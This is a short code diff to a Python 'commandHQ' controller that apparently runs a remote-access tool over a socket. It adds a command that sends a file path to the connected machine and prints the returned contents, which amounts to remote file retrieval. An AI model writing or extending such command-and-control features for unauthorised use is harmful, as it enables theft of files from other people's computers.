@@ -120,6 +120,19 @@ def commandHQ():
             except:
                 reload()
 
+        if command == "4":
+            try:
+                path = input(format + "Enter path: ")
+
+                message = str(["rtf", path])
+                message = message.encode()
+
+                conn.send(message)
+                ans = True
+            except:
+                reload()
+
+
         if(ans == False): commandHQ()
 
         if(conn.recv):
@@ -135,6 +148,9 @@ def commandHQ():
                 print(format + "Data received: {}".format(incoming_message[1]))
 
             if incoming_message[0] == "ewc": # 3
+                print(format + "Data received: {}".format(incoming_message[1]))
+                
+            if incoming_message[0] == "rtf": # 4
                 print(format + "Data received: {}".format(incoming_message[1]))
 
 clear()
